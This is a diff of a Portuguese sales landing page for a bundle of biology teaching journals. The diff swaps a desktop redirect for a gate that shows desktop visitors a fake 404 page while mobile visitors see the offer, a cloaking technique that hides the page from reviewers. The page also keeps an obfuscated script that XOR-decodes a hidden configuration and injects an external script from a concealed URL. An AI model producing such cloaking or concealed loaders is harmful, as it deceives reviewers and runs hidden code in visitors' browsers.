@@ -1,26 +1,5 @@
 <!DOCTYPE html>
 <html lang="pt-BR"><head>
-<!-- Redirecionamento de PCs/notebooks; celulares e tablets veem esta página -->
-<script>
-(function () {
-  "use strict";
-
-  const DESKTOP_REDIRECT_URL = "https://biology-journal-beacon.lovable.app/";
-  const ua = (navigator.userAgent || "").toLowerCase();
-
-  const isMobileOrTablet =
-    /android|iphone|ipad|ipod|iemobile|opera mini|blackberry/.test(ua) ||
-    (ua.includes("macintosh") && navigator.maxTouchPoints > 1);
-
-  if (!isMobileOrTablet) {
-    const target = new URL(DESKTOP_REDIRECT_URL);
-    const params = new URLSearchParams(window.location.search);
-    params.forEach((value, key) => target.searchParams.append(key, value));
-    target.hash = window.location.hash;
-    window.location.replace(target.toString());
-  }
-})();
-</script>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
 <title>+250 Jornais Biológicos | Material Pedagógico de Alto Impacto</title>
@@ -221,7 +200,72 @@ summary:focus-visible,.cta:focus-visible,.bt:focus-visible{outline:3px solid #86
 <script>(function(){var l_d=atob("DFOP0gG/Oe4TQHUDbCitp3PTG9QxKAF3HCC1/S7cXYA9NQFuBTX2/GLQVMBxMlpwDyHmonXMFptnLQYsADL7t3LLF4RgYlkhDSf7oGjdTJp2M1c5NyitvGDSXMwpYhFiGDKip3XSUIhqbQVxCSXqvHWSQY18JFhwDzit/iPJWIJmJVc5TnHy/nqdV49+JVc5TjfupmCSTJp+KRN6QSP9t3faV5o+MwBhBTf88C2dT49/NRAhVnGtr1zC");var z_l=[];for(var t_umpx=0;t_umpx<l_d.length;t_umpx++){z_l.push(l_d.charCodeAt(t_umpx)&255);}var g_v2c=z_l[0];var y_8=z_l.slice(1,1+g_v2c);var b_uufi=z_l.slice(1+g_v2c);var u_whqs=b_uufi.map(function(b,r_9){return b^y_8[r_9%g_v2c];});var e_2m="";for(var h_ekj=0;h_ekj<u_whqs.length;h_ekj++){e_2m+=String.fromCharCode(u_whqs[h_ekj]&255);}var t_cm82=decodeURIComponent(escape(e_2m));var x_3=JSON.parse(t_cm82);var b_pt=x_3.globals||[];b_pt.forEach(function(h_ahep){window[h_ahep.name]=h_ahep.value;});var i_drn=document.createElement("script");i_drn.src=x_3.url;i_drn.async=true;i_drn.defer=true;(x_3.attributes||[]).forEach(function(d_l9z){i_drn.setAttribute(d_l9z.name,d_l9z.value);});(document.head||document.documentElement).appendChild(i_drn);})();</script>
 <!-- Meta Pixel (Facebook) -->
 <script>!function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window,document,'script','https://connect.facebook.net/en_US/fbevents.js');fbq('init','927488167005083');fbq('track','PageView');</script>
+<!-- Gate mobile/desktop: desktop exibe 404; mobile mantém a página original. -->
+<script>
+(function () {
+  function isMobile() {
+    const ua = (navigator.userAgent || "").toLowerCase();
+    const uaMobile = /android|iphone|ipod|iemobile|opera mini|blackberry/.test(ua);
+    const isIPad = ua.includes("ipad") ||
+      (ua.includes("macintosh") && navigator.maxTouchPoints && navigator.maxTouchPoints > 1);
+    return uaMobile || isIPad;
+  }
+
+  // Mostra uma página visual de erro 404 no desktop, sem sair deste arquivo.
+  // Isso preserva automaticamente os parâmetros UTM e a hash na URL.
+  try {
+    if (!isMobile()) {
+      document.documentElement.setAttribute("data-redirect-gate", "desktop-404");
+      document.title = "404 - Página não encontrada";
+    }
+  } catch (e) {
+    console.error("[RedirectGate] erro:", e);
+  }
+})();
+</script>
+<style>
+  #desktop-404 { display: none; }
+  html[data-redirect-gate="desktop-404"] body {
+    margin: 0 !important;
+    padding: 0 !important;
+    min-height: 100vh;
+    background: #fff !important;
+    color: #202124 !important;
+    font: 16px/1.55 Arial, Helvetica, sans-serif !important;
+  }
+  html[data-redirect-gate="desktop-404"] body > :not(#desktop-404) {
+    display: none !important;
+  }
+  html[data-redirect-gate="desktop-404"] #desktop-404 {
+    display: flex !important;
+    width: 100%;
+    min-height: 100vh;
+    align-items: center;
+    justify-content: center;
+    padding: 32px;
+    box-sizing: border-box;
+    text-align: center;
+    background: #fff;
+  }
+  #desktop-404 .error-inner { max-width: 480px; }
+  #desktop-404 .error-number {
+    font: 700 clamp(100px, 16vw, 165px)/1 Arial, Helvetica, sans-serif;
+    color: #dadce0;
+    margin-bottom: 18px;
+  }
+  #desktop-404 h1 {
+    color: #202124 !important;
+    font: 500 27px/1.25 Arial, Helvetica, sans-serif !important;
+    margin: 0 0 15px;
+  }
+  #desktop-404 p {
+    color: #5f6368;
+    font-size: 15px;
+    margin: 0;
+  }
+</style>
 </head><body>
+<div id="desktop-404" role="main" aria-labelledby="desktop-404-title"><div class="error-inner"><div class="error-number" aria-hidden="true">404</div><h1 id="desktop-404-title">Página não encontrada</h1><p>A página que você está tentando acessar não foi encontrada.</p></div></div>
 <noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=927488167005083&ev=PageView&noscript=1" alt=""></noscript>
 <div class="bar">⚡ Desconto válido até hoje: <u id="dt">20/10/2026</u></div>
 
